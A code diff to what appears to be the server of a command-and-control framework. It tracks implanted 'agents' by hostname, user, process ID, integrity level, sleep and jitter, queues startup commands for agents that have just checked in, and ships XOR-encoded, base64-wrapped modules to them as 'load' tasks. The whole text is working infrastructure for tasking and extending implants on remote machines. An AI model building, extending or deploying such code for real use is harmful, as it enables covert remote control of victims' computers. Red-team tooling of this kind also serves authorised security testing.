@@ -34,22 +34,26 @@ def _retrieve_error(task, error):
 
 def _retrieve_results(task, result, errno):
     agent = task.agent
+    command = task.name
 
     # A batch result is reserved to set agent properties.
     if isinstance(result, list) and errno == 'results':
         _result = result[0]
         _property = base64_to_string(result[1])
-        if task.name == 'hostname':
+        if command == 'hostname':
             agent.hostname = _property
-        if task.name == 'whoami':
+        if command == 'load':
+            module_name = _property
+            agent.loaded_modules = _property.lower() if not agent.loaded_modules else ','.join(agent.loaded_modules) + f',{_property.lower()}'
+        if command == 'whoami':
             agent.username = _property
-        if task.name == 'pid':
+        if command == 'pid':
             agent.pid = _property
-        if task.name == 'integrity':
+        if command == 'integrity':
             agent.integrity = _property
-        if task.name == 'set sleep':
+        if command == 'set sleep':
             agent.sleep = _property
-        if task.name == 'set jitter':
+        if command == 'set jitter':
             agent.jitter = _property
     else:
         _result = result
@@ -99,7 +103,8 @@ def _retrieve_unsent_tasks(task):
     for unsent_task in agent.tasks:
         if unsent_task.sent:
             continue
-        websocket.emit('task_sent', f'Tasked agent {agent.name} to {unsent_task.description}.')
+        if unsent_task.type > 0:
+            websocket.emit('task_sent', f'Tasked agent {agent.name} to {unsent_task.description}.')
         unsent_task.sent = datetime.datetime.now()
         _commit([unsent_task])
         _unsent_tasks.append({"jsonrpc": "2.0", "name": unsent_task.name, "arguments": unsent_task.arguments,
@@ -120,6 +125,9 @@ def endpoint(uri):
 
     if implant:
         agent = AgentModel(implant=implant, sleep=implant.sleep, jitter=implant.jitter)
+        for task in agent.implant.startup_commands:
+            _task = TaskModel(name=task, description='startup task', agent=agent, type=-1)
+            _commit([_task])
         check_in_task = TaskModel(name='check_in', description='check in', agent=agent, type=-1)
         check_in_task.completed = datetime.datetime.now()
         check_in_task.sent = datetime.datetime.now()
@@ -213,14 +221,16 @@ def new_task(data):
     """
     data = json.loads(data)
     agent = AgentModel.query.filter_by(name=data['agent_name']).first()
-    available_commands = agent.implant.available_commands
+    available_modules = agent.implant.available_modules
     command = data['name']
-    if command in available_commands.keys() and command not in agent.loaded_commands:
-        agent.loaded_commands = command if not agent.loaded_commands else ','.join(agent.loaded_commands) + f',{command}'
-        module = available_commands[command]
-        with open(f'{os.getcwd()}{module}', 'rb') as fd:
-            key, file = xor_base64(fd.read())
-        task = TaskModel(name='load', description=f'load module for {command}', agent=agent, arguments=f'{key},{file},{string_to_base64(command)}', type='1')
-        _commit([task, agent])
+    if command in available_modules.keys():
+        module_name = available_modules[command][1].lower()
+        module_resource = available_modules[command][0]
+        if module_name not in agent.loaded_modules:
+            agent.loaded_modules = command if not agent.loaded_modules else ','.join(agent.loaded_modules) + f',{command}'
+            with open(f'{os.getcwd()}{module_resource}', 'rb') as fd:
+                key, file = xor_base64(fd.read())
+            task = TaskModel(name='load', description=f'load module {module_name} for {command}', agent=agent, arguments=f'{key},{file},{string_to_base64(command)}', type='1')
     task = TaskModel(name=command, description=data['description'], agent=agent, arguments=data['arguments'], type=data['type'])
     _commit([task])
+
